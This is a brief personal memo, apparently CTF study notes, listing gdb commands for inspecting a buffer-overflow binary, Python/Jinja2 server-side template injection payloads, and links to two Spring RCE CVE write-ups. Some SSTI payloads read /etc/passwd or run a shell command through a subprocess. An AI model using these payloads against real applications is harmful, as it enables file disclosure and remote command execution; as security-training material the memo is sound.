# CADT Memo

## 시스템 프로그래밍

```bash
gdb ./bof
> info functions
> disas main
> x/40x $esp
> x/x $eip
```

## SSTI

```
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

```

## Spring RCE

[cve-2018-1270](https://steemit.com/kr/@huti/spring-messaging-rce-cve-2018-1270)
[cve-2018-1273](https://github.com/jas502n/cve-2018-1273)